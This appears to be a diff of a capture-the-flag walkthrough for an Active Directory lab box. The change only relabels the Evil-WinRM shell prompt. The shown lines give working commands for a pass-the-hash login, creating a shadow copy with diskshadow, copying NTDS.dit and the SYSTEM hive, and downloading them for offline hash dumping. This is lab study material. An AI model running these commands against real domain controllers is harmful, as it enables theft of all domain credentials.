@@ -248,20 +248,20 @@ ewp -i blackfield.local -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
 ### Volume Shadow Copy via Diskshadow
 
 ```powershell
-*Evil-WinRM* PS C:\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
-*Evil-WinRM* PS C:\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
-*Evil-WinRM* PS C:\temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append
-*Evil-WinRM* PS C:\temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
-*Evil-WinRM* PS C:\temp> diskshadow.exe /s c:\temp\diskshadow.txt
+evil-winrm-py PS C:\temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
+evil-winrm-py PS C:\temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
+evil-winrm-py PS C:\temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append
+evil-winrm-py PS C:\temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
+evil-winrm-py PS C:\temp> diskshadow.exe /s c:\temp\diskshadow.txt
 ```
 
 ### Extract NTDS.dit and SYSTEM Hive
 
 ```powershell
-*Evil-WinRM* PS C:\temp> robocopy /b Z:\Windows\NTDS C:\temp ntds.dit
-*Evil-WinRM* PS C:\temp> reg save hklm\system SYSTEM
-*Evil-WinRM* PS C:\temp> download ntds.dit .
-*Evil-WinRM* PS C:\temp> download system .
+evil-winrm-py PS C:\temp> robocopy /b Z:\Windows\NTDS C:\temp ntds.dit
+evil-winrm-py PS C:\temp> reg save hklm\system SYSTEM
+evil-winrm-py PS C:\temp> download ntds.dit .
+evil-winrm-py PS C:\temp> download system .
 ```
 
 ### Dump Hashes Offline
